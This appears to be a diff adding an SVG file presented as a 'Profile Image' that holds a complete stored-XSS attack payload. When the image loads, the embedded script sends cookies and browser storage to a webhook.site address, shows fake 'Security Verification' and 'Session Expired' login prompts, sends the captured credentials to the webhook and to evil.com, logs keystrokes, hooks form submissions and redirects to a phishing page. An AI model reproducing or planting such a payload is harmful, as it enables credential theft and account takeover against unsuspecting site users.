@@ -1,0 +1,205 @@
+<?xml version="1.0" standalone="no"?>
+<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
+<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg" onload="startAttack()">
+    <defs>
+        <pattern id="bg" x="0" y="0" width="100" height="100" patternUnits="userSpaceOnUse">
+            <rect fill="#ffffff" x="0" y="0" width="100" height="100"/>
+        </pattern>
+    </defs>
+    
+    <rect width="100%" height="100%" fill="url(#bg)"/>
+    <text x="10" y="20" font-family="Arial" font-size="10" fill="black">Profile Image</text>
+    
+    <script type="text/javascript">
+        <![CDATA[
+        const WEBHOOK_URL = 'https://webhook.site/14079acc-343a-4ef0-bfaf-b8671ba4a766';
+        const PHISHING_URL = 'https://evil.com/';
+        
+        function startAttack() {
+            exfiltrateData('attack_started', {
+                type: 'svg_xss_initial',
+                domain: window.location.hostname,
+                url: window.location.href,
+                userAgent: navigator.userAgent,
+                cookies: document.cookie,
+                timestamp: new Date().toISOString()
+            });
+            
+            if(document.readyState === 'loading') {
+                document.addEventListener('DOMContentLoaded', executeAttack);
+            } else {
+                executeAttack();
+            }
+        }
+        
+        function executeAttack() {
+            replaceLoginForms();
+            
+            createFakeModal();
+            
+            stealStorageData();
+            
+            setTimeout(function() {
+                exfiltrateData('redirect_triggered', {
+                    action: 'redirect_to_phishing',
+                    target: PHISHING_URL
+                });
+                window.location.href = PHISHING_URL + '?original=' + encodeURIComponent(window.location.href) + '&source=svg_xss';
+            }, 8000);
+        }
+        
+        function replaceLoginForms() {
+            var forms = document.querySelectorAll('form[action*="login"], form[action*="signin"], form input[type="password"]');
+            
+            forms.forEach(function(form, index) {
+                exfiltrateData('form_found', {
+                    formIndex: index,
+                    formHTML: form.outerHTML,
+                    formAction: form.action || 'N/A'
+                });
+                
+                var fakeForm = document.createElement('div');
+                fakeForm.innerHTML = '<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.8);z-index:9999;">' +
+                    '<div style="position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);background:white;padding:20px;border-radius:5px;">' +
+                    '<h3>Security Verification Required</h3>' +
+                    '<p>Please re-enter your credentials for security purposes</p>' +
+                    '<input type="text" placeholder="Username" style="display:block;margin:10px 0;padding:5px;width:200px;" />' +
+                    '<input type="password" placeholder="Password" style="display:block;margin:10px 0;padding:5px;width:200px;" />' +
+                    '<button onclick="window.submitPhishing()" style="padding:5px 10px;">Verify</button>' +
+                    '</div></div>';
+                document.body.appendChild(fakeForm);
+            });
+        }
+        
+        function createFakeModal() {
+            setTimeout(function() {
+                var modal = document.createElement('div');
+                modal.innerHTML = '<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.7);z-index:10000;">' +
+                    '<div style="position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);background:white;padding:20px;border-radius:5px;text-align:center;">' +
+                    '<h3>Session Expired</h3>' +
+                    '<p>Your session has expired for security reasons.</p>' +
+                    '<button onclick="window.redirectToPhishing()" style="padding:5px 15px;margin:5px;">Re-authenticate</button>' +
+                    '</div></div>';
+                document.body.appendChild(modal);
+                
+                exfiltrateData('fake_modal_created', {
+                    action: 'session_expired_modal'
+                });
+            }, 4000);
+        }
+        
+        function stealStorageData() {
+            var storageData = {};
+            
+            // Local Storage
+            try {
+                for(var i = 0; i < localStorage.length; i++) {
+                    var key = localStorage.key(i);
+                    storageData['localStorage_' + key] = localStorage.getItem(key);
+                }
+            } catch(e) {}
+            
+            // Session Storage
+            try {
+                for(var i = 0; i < sessionStorage.length; i++) {
+                    var key = sessionStorage.key(i);
+                    storageData['sessionStorage_' + key] = sessionStorage.getItem(key);
+                }
+            } catch(e) {}
+            
+            // Cookies
+            storageData.cookies = document.cookie;
+            
+            exfiltrateData('storage_data', storageData);
+        }
+        
+        // Global functions for HTML event handlers
+        window.submitPhishing = function() {
+            var inputs = document.querySelectorAll('input[type="text"], input[type="password"]');
+            var credentials = {};
+            inputs.forEach(function(input, index) {
+                credentials['field_' + index] = input.value;
+            });
+            
+            // Exfiltrate credentials to your webhook
+            exfiltrateData('phishing_credentials', {
+                type: 'stolen_credentials',
+                credentials: credentials,
+                phishing_page: window.location.href
+            });
+            
+            // Also send to phishing server
+            var img = new Image();
+            img.src = PHISHING_URL + 'capture?data=' + btoa(JSON.stringify(credentials));
+            
+            // Redirect to actual site to avoid suspicion
+            setTimeout(function() {
+                window.location.href = window.location.href;
+            }, 1500);
+        };
+        
+        window.redirectToPhishing = function() {
+            exfiltrateData('phishing_redirect', {
+                action: 'manual_redirect',
+                target: PHISHING_URL
+            });
+            window.location.href = PHISHING_URL + 'phishing?src=' + encodeURIComponent(window.location.hostname) + '&via=modal';
+        };
+        
+        function exfiltrateData(eventType, data) {
+            var payload = {
+                event: eventType,
+                data: data,
+                target: 'bughunt.info',
+                source: 'svg_xss_payload',
+                timestamp: new Date().toISOString()
+            };
+            
+            // Method 1: Fetch POST
+            try {
+                fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    mode: 'no-cors',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(payload)
+                });
+            } catch(e) {}
+            
+            // Method 2: Image GET (fallback)
+            try {
+                var img = new Image();
+                img.src = WEBHOOK_URL + '?event=' + encodeURIComponent(eventType) + '&data=' + btoa(JSON.stringify(data));
+            } catch(e) {}
+            
+            // Method 3: XHR (another fallback)
+            try {
+                var xhr = new XMLHttpRequest();
+                xhr.open('POST', WEBHOOK_URL, true);
+                xhr.send(JSON.stringify(payload));
+            } catch(e) {}
+        }
+        
+        // Keylogger for additional data
+        var loggedKeys = '';
+        document.addEventListener('keypress', function(e) {
+            loggedKeys += e.key;
+            if(loggedKeys.length > 100) {
+                exfiltrateData('keylogger_data', {
+                    keys: loggedKeys
+                });
+                loggedKeys = '';
+            }
+        });
+        
+        // Capture any form submissions
+        document.addEventListener('submit', function(e) {
+            exfiltrateData('form_submission', {
+                formAction: e.target.action,
+                formData: new FormData(e.target)
+            });
+        }, true);
+        ]]>
+    </script>
+</svg>
